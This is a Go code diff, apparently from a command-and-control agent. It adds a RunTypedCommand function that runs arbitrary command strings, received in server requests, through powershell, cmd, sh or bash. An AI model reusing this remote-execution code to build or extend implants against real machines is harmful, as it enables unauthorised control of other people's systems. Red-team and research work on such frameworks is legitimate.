@@ -114,10 +114,6 @@ func GetExecutablePath() string {
 	return path
 }
 
-func DefaultCapabilities() []string {
-	return []string{"commands", "files"}
-}
-
 func getHostname() (string, error) {
 	hostname, err := fqdn.FqdnHostname()
 	if err != nil {
@@ -138,12 +134,30 @@ func getUsername() (string, error) {
 }
 
 func RunShellCommand(command string) string {
+	return RunTypedCommand("shell", command)
+}
+
+func RunTypedCommand(commandType string, command string) string {
 	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
+	switch commandType {
+	case "powershell":
 		cmd = exec.Command("powershell", "-Command", command)
-	} else {
+	case "cmd":
+		cmd = exec.Command("cmd", "/C", command)
+	case "sh":
+		cmd = exec.Command("sh", "-c", command)
+	case "bash":
 		cmd = exec.Command("bash", "-c", command)
+	case "shell":
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("powershell", "-Command", command)
+		} else {
+			cmd = exec.Command("bash", "-c", command)
+		}
+	default:
+		return fmt.Sprintf("Unsupported command type: %s", commandType)
 	}
+
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		logger.Logf(logger.Error, "Error running command: %v", command)
@@ -670,8 +684,8 @@ func executeCommandRequest(cmd *patronobuf.CommandResponse) *patronobuf.CommandS
 
 	var output, result string
 	switch cmd.GetCommandtype() {
-	case "shell":
-		output = RunShellCommand(cmd.GetCommand())
+	case "shell", "sh", "bash", "powershell", "cmd":
+		output = RunTypedCommand(cmd.GetCommandtype(), cmd.GetCommand())
 		result = "1"
 	case "kill":
 		output = "~Killed~"
